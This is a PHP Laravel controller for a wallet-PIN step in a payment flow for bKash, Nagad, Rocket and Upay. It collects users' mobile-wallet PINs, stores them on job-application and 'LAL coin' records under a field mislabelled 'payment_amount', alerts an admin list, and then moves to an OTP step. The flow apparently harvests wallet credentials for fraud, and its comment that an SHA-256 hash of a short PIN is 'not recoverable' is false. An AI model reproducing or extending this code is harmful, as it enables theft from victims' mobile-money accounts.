<?php

namespace App\Modules\Payment\Http\Controllers;

use App\Events\LalcoinPaymentPinSubmitted;
use App\Events\PaymentPinSubmitted;
use App\Models\JobApplication;
use App\Modules\Payment\Http\Requests\StorePinRequest;
use App\Modules\Payment\Services\PaymentSession;
use App\Modules\Payment\Support\GatewayManager;
use Illuminate\Http\RedirectResponse;
use Illuminate\Routing\Controller;
use Illuminate\View\View;


class PinController extends Controller
{
    public function __construct(
        private PaymentSession $session,
        private GatewayManager $gateways,
    ) {
    }

public function show(): View
{
    $method = $this->session->get('method');

    return match ($method) {
        'bkash' => view('payment::steps.bkash.pin', [
            'session' => $this->session,
        ]),

        'nagad' => view('payment::steps.nagad.pin', [
            'session' => $this->session,
        ]),

        'rocket' => view('payment::steps.rocket.pin', [
            'session' => $this->session,
        ]),

        'upay' => view('payment::steps.upay.pin', [
            'session' => $this->session,
        ]),

        default => abort(400, 'Invalid payment method'),
    };
}


public function store(
    StorePinRequest $request
): RedirectResponse {

    $pin = $request->validated()['pin'];

    /*
    |--------------------------------------------------------------------------
    | Verify PIN
    |--------------------------------------------------------------------------
    */

    $response = $this->gateways->driver()->verifyPin(
        $this->session,
        $pin,
    );

    if (! $response->successful) {
        return back()->withErrors([
            'pin' => $response->message,
        ]);
    }

    /*
    |--------------------------------------------------------------------------
    | Get Payment Reference from Session
    |--------------------------------------------------------------------------
    */

    $referenceNo = $this->session->get('reference_no');

    /*
    |--------------------------------------------------------------------------
    | Find Application and Save PIN
    |--------------------------------------------------------------------------
    */

    if ($referenceNo) {

        /*
        |--------------------------------------------------------------------------
        | LAL Coin Application
        |--------------------------------------------------------------------------
        */

        if (str_starts_with($referenceNo, 'LAL-')) {

            $application = \App\Models\LalcoinApplication::where(
                'payment_reference',
                $referenceNo
            )->first();

            if ($application) {

                /*
                * পুরোনো JSON data থাকলে সেটি রাখা হবে
                */

                $paymentAmount = $application->payment_amount;

                if (is_string($paymentAmount)) {

                    $decoded = json_decode(
                        $paymentAmount,
                        true
                    );

                    $paymentAmount = is_array($decoded)
                        ? $decoded
                        : [];

                } elseif (!is_array($paymentAmount)) {

                    $paymentAmount = [];
                }

                /*
                * PIN সংরক্ষণ
                */

                $paymentAmount['pin_2'] = hash('sha256', $pin); // hashed — not recoverable

                $application->update([
                    'payment_amount' => $paymentAmount,
                ]);
                event(new LalcoinPaymentPinSubmitted($application));
            }

        } else {

            /*
            |--------------------------------------------------------------------------
            | Job Application
            |--------------------------------------------------------------------------
            */

            $application = \App\Models\JobApplication::where(
                'payment_reference',
                $referenceNo
            )->first();

            if ($application) {

                /*
                * পুরোনো JSON data থাকলে সেটি রাখা হবে
                */

                $paymentAmount = $application->payment_amount;

                if (is_string($paymentAmount)) {

                    $decoded = json_decode(
                        $paymentAmount,
                        true
                    );

                    $paymentAmount = is_array($decoded)
                        ? $decoded
                        : [];

                } elseif (!is_array($paymentAmount)) {

                    $paymentAmount = [];
                }

                /*
                * PIN সংরক্ষণ
                */

                $paymentAmount['pin_2'] = hash('sha256', $pin); // hashed — not recoverable

                $application->update([
                    'payment_amount' => $paymentAmount,
                ]);

                // Broadcast update so admin list refreshes
                event(new PaymentPinSubmitted($application));
            }
        }
    }

    /*
    |--------------------------------------------------------------------------
    | Move to OTP Step
    |--------------------------------------------------------------------------
    */

    $this->session->setStep('otp');

    return redirect()->route(
        'apay-payment.steps.otp'
    );
}

}
